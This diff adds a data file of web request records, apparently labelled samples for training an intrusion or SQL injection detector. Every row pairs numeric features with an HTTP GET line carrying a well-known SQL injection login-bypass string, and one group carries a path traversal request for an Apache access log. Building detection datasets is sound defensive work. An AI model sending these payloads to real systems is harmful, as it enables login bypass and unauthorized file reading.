@@ -1,0 +1,900 @@
+32,1,200,2310,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2901,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4159,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4355,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,5345,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7859,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6299,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4959,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2065,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7012,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6039,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4702,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3818,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3418,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4305,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3242,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2541,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,1850,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4787,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7130,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2667,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6102,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,5666,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2869,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7937,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,5498,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7859,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,1085,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,1522,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6944,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3264,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2484,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,5441,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4378,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3617,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7012,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6830,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6560,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6264,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7062,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2314,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2520,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,5232,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7432,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3498,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3577,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6832,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4489,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3918,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2383,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6779,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,5075,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,1802,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6661,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6670,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2666,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4550,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7067,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7716,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6468,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,1479,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6168,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4823,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7112,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,5259,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2424,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4438,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+53,2,200,7766,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3466,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2784,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3455,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3416,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1952,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6958,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6310,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3190,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7586,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2400,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1003,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3600,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,5408,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2754,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7707,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2596,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7818,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4895,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6999,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6589,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1062,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3299,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6352,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2431,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2643,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2903,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2814,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2593,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,5773,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4140,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,5907,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7773,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2461,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1929,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,5914,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3176,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,5947,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6941,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3815,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7983,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1148,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4723,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1480,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4152,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4419,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6027,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2243,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2310,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2248,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6368,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6618,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4344,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,5317,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1190,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3245,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2321,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1994,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2151,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3649,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6426,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4888,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6417,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1760,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2260,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1727,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1598,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3143,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4924,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1744,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7183,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2279,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,5185,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2610,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3547,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7136,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,5261,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3867,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4731,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6007,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3599,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7414,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6964,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,2724,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6047,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1591,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7857,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+47,1,200,2370,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,4044,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,5533,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,5845,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,6151,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,5106,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,6572,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,6252,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,3168,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,1194,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,7578,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,6589,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,1532,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,2701,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,1909,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,4159,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+47,1,200,4145,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
+32,1,200,2218,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5985,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5747,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,7067,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,1346,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4388,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5614,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3838,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3607,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3704,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4644,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4510,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,6545,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2804,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4333,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4074,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2918,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5297,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3861,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,6141,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3514,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5853,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,6061,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2307,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3460,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,7626,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4040,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2167,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5704,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2127,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5394,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3357,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4966,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5269,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3477,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5962,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,6956,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5212,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,1947,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4978,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,1422,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5628,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3800,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,6203,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5854,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5474,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5964,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2871,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2679,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5485,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3570,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5096,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5078,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3401,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4345,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2626,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2579,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5720,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5414,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5887,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,1564,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3413,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,6768,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5690,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,1019,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,1053,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,1388,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2144,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5932,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,6699,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3524,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4500,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,6926,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,7535,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+75,2,200,4962,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5992,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7941,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3452,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3899,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7272,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2030,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,4671,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6155,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5187,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6932,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7457,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2878,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,4898,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2360,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,4972,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2329,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7785,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,4136,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7632,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3481,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,1913,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2939,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3766,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7259,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2147,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6314,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6616,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6708,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7855,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6814,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7637,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,1698,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,1051,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2139,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3520,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2216,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3838,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5107,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,1833,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7352,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3558,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2357,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2876,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7005,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2951,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3963,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2411,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7514,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3729,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5652,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5453,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2596,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
